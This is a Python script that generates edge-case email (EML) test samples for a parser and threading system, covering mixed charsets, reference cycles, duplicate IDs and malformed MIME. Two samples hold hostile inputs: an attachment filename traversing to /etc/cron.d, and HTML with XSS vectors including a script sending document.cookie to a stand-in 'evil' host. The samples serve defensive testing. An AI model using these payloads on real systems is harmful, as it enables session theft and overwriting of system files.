"""Generate edge-case EML samples into ``samples/``.

Run:  python scripts/generate_samples.py

Each sample exercises a specific parser/storage/threading boundary. The
samples are static files so they can also be inspected manually or fed to the
API with curl.
"""
from __future__ import annotations

from email.header import Header
from pathlib import Path

OUT = Path(__file__).resolve().parent.parent / "samples"


def ew(text: str, charset: str = "utf-8") -> str:
    """Encode one RFC2047 encoded-word token with a declared charset."""
    return Header(text, charset).encode()


def write(name: str, data: bytes) -> None:
    path = OUT / name
    path.write_bytes(data)
    print(f"wrote {path} ({len(data)} bytes)")


def multibyte() -> bytes:
    """Multi-layer MIME + multiple charsets + RFC2047 + inline resource."""
    from_name = ew("老王 (José Lövråt 🎉)", "utf-8")
    to_cn = ew("【点名册】", "gb18030")
    to_jp = ew("ドタバタＸヌ", "shift_jis")
    subject = ew("多编码测试 — éπü", "utf-8")
    return (
        b"Received: by mail.example.com; Tue, 30 Sep 2026 09:00:00 +0000\r\n"
        b"Received: by edge.example.net; Tue, 30 Sep 2026 09:02:00 +0000\r\n"
        b"Message-ID: <multi-01@example.com>\r\n"
        b"In-Reply-To: <parent-01@example.com>\r\n"
        b"References: <root-00@example.com> <parent-01@example.com>\r\n"
        + f"From: {from_name} <sigs@example.com>\r\n".encode()
        + f"To: {to_cn} <cn@example.com>, {to_jp} <jp@example.com>\r\n".encode()
        + f"Subject: {subject}\r\n".encode()
        + b"Date: Tue, 30 Sep 2026 11:00:00 +0200\r\n"
        b"MIME-Version: 1.0\r\n"
        b'Content-Type: multipart/mixed; boundary="MIX"\r\n\r\n'
        b"--MIX\r\n"
        b'Content-Type: multipart/alternative; boundary="ALT"\r\n\r\n'
        b"--ALT\r\n"
        b"Content-Type: text/plain; charset=utf-8\r\n\r\n"
        + "多编码正文 — UTF-8 body with émojis 📎 café.\r\n".encode("utf-8")
        + b"--ALT\r\n"
        b"Content-Type: text/plain; charset=gb18030\r\n\r\n"
        + "这是 GB18030 编码的替代正文。\r\n".encode("gb18030")
        + b"--ALT\r\n"
        b'Content-Type: multipart/related; boundary="REL"; type="text/html"\r\n\r\n'
        b"--REL\r\n"
        b"Content-Type: text/html; charset=iso-8859-1\r\n\r\n"
        b"<p>Caf&eacute; <img src=cid:banner1 alt=ok> "
        b"<img src=http://tracker.example/beacon.png></p>\r\n"
        b"--REL\r\n"
        b"Content-Type: image/gif\r\n"
        b"Content-ID: <banner1>\r\n"
        b"Content-Disposition: inline; filename=banner.gif\r\n\r\n"
        b"GIF89aFAKEGIFDATA"
        b"\r\n--REL--\r\n"
        b"--ALT--\r\n"
        b"--MIX\r\n"
        b'Content-Type: message/rfc822; name="forwarded.eml"\r\n'
        b"Content-Disposition: inline\r\n\r\n"
        b"Message-ID: <embedded-01@example.com>\r\n"
        b"From: Forwarder <fwd@example.com>\r\n"
        b"Subject: Forwarded nested\r\n"
        b"Content-Type: text/plain; charset=shift_jis\r\n\r\n"
        + "これは埋め込み転送メッセージです。\r\n".encode("shift_jis")
        + b"\r\n"
        b"--MIX\r\n"
        b'Content-Type: application/pdf; name="=?utf-8?b?5paH5pysLnBkZg==?="\r\n'
        b'Content-Disposition: attachment; filename="=?utf-8?b?5paH5pysLnBkZg==?="\r\n'
        b"Content-Transfer-Encoding: base64\r\n\r\n"
        b"JVBERi0xLjQKZmFrZSBwZGYgY29udGVudCBieXRlcwo=\r\n"
        b"--MIX--\r\n"
    )


def circular_a() -> bytes:
    return (
        b"Message-ID: <cycle-a@example.com>\r\n"
        b"References: <cycle-b@example.com> <cycle-c@example.com>\r\n"
        b"In-Reply-To: <cycle-b@example.com>\r\n"
        b"From: a@example.com\r\nSubject: Circular thread A\r\n"
        b"Date: Mon, 29 Sep 2026 08:00:00 +0000\r\n"
        b"Content-Type: text/plain\r\n\r\nA references B\r\n"
    )


def circular_b() -> bytes:
    return (
        b"Message-ID: <cycle-b@example.com>\r\n"
        b"References: <cycle-a@example.com>\r\n"
        b"In-Reply-To: <cycle-a@example.com>\r\n"
        b"From: b@example.com\r\nSubject: Re: Circular thread A\r\n"
        b"Date: Mon, 29 Sep 2026 09:00:00 +0000\r\n"
        b"Content-Type: text/plain\r\n\r\nB references A (cycle)\r\n"
    )


def missing_id() -> bytes:
    return (
        b"From: nobody@example.com\r\n"
        b"Subject: Draft with no identity headers\r\n"
        b"Date: Mon, 29 Sep 2026 07:00:00 +0000\r\n"
        b'Content-Type: text/plain; charset="bogus-charset-99"\r\n\r\n'
        b"unknown charset payload: hello \xff world\r\n"
    )


def duplicate_id_a() -> bytes:
    return (
        b"Message-ID: <dup-1@example.com>\r\n"
        b"From: first@example.com\r\nSubject: Duplicate ID first\r\n"
        b"Date: Mon, 29 Sep 2026 10:00:00 +0000\r\n"
        b"Content-Type: text/plain\r\n\r\nfirst copy\r\n"
    )


def duplicate_id_b() -> bytes:
    return (
        b"Message-ID: <dup-1@example.com>\r\n"
        b"From: second@example.com\r\nSubject: Duplicate ID second (conflict)\r\n"
        b"Date: Mon, 29 Sep 2026 12:00:00 +0000\r\n"
        b"Content-Type: text/plain\r\n\r\nsecond copy, same Message-ID\r\n"
    )


def same_subject_different_threads() -> bytes:
    """Same subject, no shared ids: must stay separate (weak candidate only)."""
    return (
        b"Message-ID: <other-x@example.com>\r\n"
        b"From: x@example.com\r\nSubject: Quarterly report\r\n"
        b"Date: Mon, 29 Sep 2026 13:00:00 +0000\r\n"
        b"Content-Type: text/plain\r\n\r\nunrelated quarterly report\r\n"
    )


def same_subject_root() -> bytes:
    return (
        b"Message-ID: <qr-1@example.com>\r\n"
        b"From: q@example.com\r\nSubject: Quarterly report\r\n"
        b"Date: Mon, 29 Sep 2026 06:00:00 +0000\r\n"
        b"Content-Type: text/plain\r\n\r\noriginal quarterly report\r\n"
    )


def corrupt_boundary() -> bytes:
    return (
        b"Message-ID: <corrupt-01@example.com>\r\n"
        b"From: broken@example.com\r\nSubject: Broken multipart boundary\r\n"
        b"Date: Tue, 30 Sep 2026 12:00:00 +0000\r\n"
        b"MIME-Version: 1.0\r\n"
        b'Content-Type: multipart/mixed; boundary="REAL"\r\n\r\n'
        b"--REAL\r\n"
        b"Content-Type: text/plain\r\n\r\nfirst part\r\n"
        b"--WRONG-BOUNDARY\r\n"  # mismatched: remaining payload is not delimited
        b"Content-Type: text/plain\r\n\r\norphaned part without proper close\r\n"
    )


def bad_cte() -> bytes:
    return (
        b"Message-ID: <badcte-01@example.com>\r\n"
        b"From: cte@example.com\r\nSubject: Invalid base64 CTE\r\n"
        b"Content-Type: application/octet-stream; name=bin.dat\r\n"
        b"Content-Disposition: attachment; filename=bin.dat\r\n"
        b"Content-Transfer-Encoding: base64\r\n\r\n"
        b"!!!not base64!!! \x00\xff\r\n"
    )


def traversal_attachment() -> bytes:
    # RFC2231 parameter continuation + traversal name; storage must neutralize.
    return (
        b"Message-ID: <trav-01@example.com>\r\n"
        b"From: evil@example.com\r\nSubject: Path traversal attempt\r\n"
        b"Date: Tue, 30 Sep 2026 13:00:00 +0000\r\n"
        b"MIME-Version: 1.0\r\n"
        b'Content-Type: multipart/mixed; boundary="T"\r\n\r\n'
        b"--T\r\nContent-Type: text/plain\r\n\r\nsee attachment\r\n--T\r\n"
        b'Content-Type: application/octet-stream;\r\n'
        b' name*0="..%2f..%2f..%2f";\r\n'
        b' name*1="etc%2fcron.d%2fpwned"\r\n'
        b'Content-Disposition: attachment; filename="../../../../etc/cron.d/pwned"\r\n\r\n'
        b"malicious payload bytes\r\n--T--\r\n"
    )


def html_xss() -> bytes:
    return (
        b"Message-ID: <xss-01@example.com>\r\n"
        b"From: xss@example.com\r\nSubject: HTML with scripts and remote refs\r\n"
        b"Date: Tue, 30 Sep 2026 14:00:00 +0000\r\n"
        b"Content-Type: text/html\r\n\r\n"
        b"<html><body><script>fetch('http://evil/?c='+document.cookie)</script>"
        b"<p onclick=\"x()\">hello</p>"
        b"<img src=x onerror=alert(1) alt=safealt>"
        b"<iframe src=//evil></iframe>"
        b"<link rel=stylesheet href=http://evil/s.css>"
        b"<a href=javascript:alert(1)>j</a><a href=https://ok.example/>ok</a>"
        b"<img src=cid:inline1><style>body{}</style></body></html>"
    )


def main() -> None:
    OUT.mkdir(parents=True, exist_ok=True)
    write("01_multibyte.eml", multibyte())
    write("02_cycle_a.eml", circular_a())
    write("02_cycle_b.eml", circular_b())
    write("03_missing_id.eml", missing_id())
    write("04_duplicate_id_a.eml", duplicate_id_a())
    write("04_duplicate_id_b.eml", duplicate_id_b())
    write("05_same_subject_root.eml", same_subject_root())
    write("05_same_subject_other.eml", same_subject_different_threads())
    write("06_corrupt_boundary.eml", corrupt_boundary())
    write("07_bad_cte.eml", bad_cte())
    write("08_traversal.eml", traversal_attachment())
    write("09_html_xss.eml", html_xss())


if __name__ == "__main__":
    main()
